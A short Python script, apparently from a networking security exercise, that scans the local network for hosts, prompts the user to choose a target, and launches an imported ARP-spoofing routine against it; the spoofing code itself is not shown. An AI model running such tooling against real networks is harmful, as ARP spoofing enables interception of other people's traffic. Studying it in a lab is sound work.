import sys
import socket

from e1.run import find_network_hosts
from e2.run import run_arp_spoofing
from e2.arp import get_mac_address

def select_target_host(hosts):
    print("\nSelect the target host to perform the attack:")
    for host, i in zip(hosts, range(1, len(hosts)+1)):
        print(f"({i}): {host}")
    print(f"({len(hosts)+1}): Exit")

    target_host = input("\nEnter the number of the target host: ")

    if not target_host.isdigit() or int(target_host) < 1 or int(target_host) > len(hosts)+1:
        print("Error: Invalid input")
        return select_target_host(hosts)

    if int(target_host) == len(hosts)+1:
        print("Exiting...")
        sys.exit(0)
        return None

    target_host = hosts[int(target_host)-1]

    confirmation = input(f"Do you confirm the target {target_host}? (Y/n): ")

    if confirmation.lower() == 'n' or confirmation.lower() == 'no':
        return select_target_host(hosts)
    elif confirmation and (confirmation.lower() != 'y' and confirmation.lower() != 'yes'):
        print("Error: Invalid input")
        return select_target_host(hosts)

    return target_host

def main():

    ########## 1 ##########
    hosts = find_network_hosts()
    print(hosts)
    if len(hosts) == 0:
        print("Error: No active hosts found in the network")
        return
    
    if len(hosts) == 1:
        print("Error: Found only 1 active host in the network, not enough hosts to perform the attack")
        return

    print(f"\nFound {len(hosts)} active hosts in the network")

    target_host = select_target_host(hosts)

    print(f"\nTarget host: {target_host}")


    ########## 2 ##########
    run_arp_spoofing(target_host)


if __name__ == '__main__':
    main()
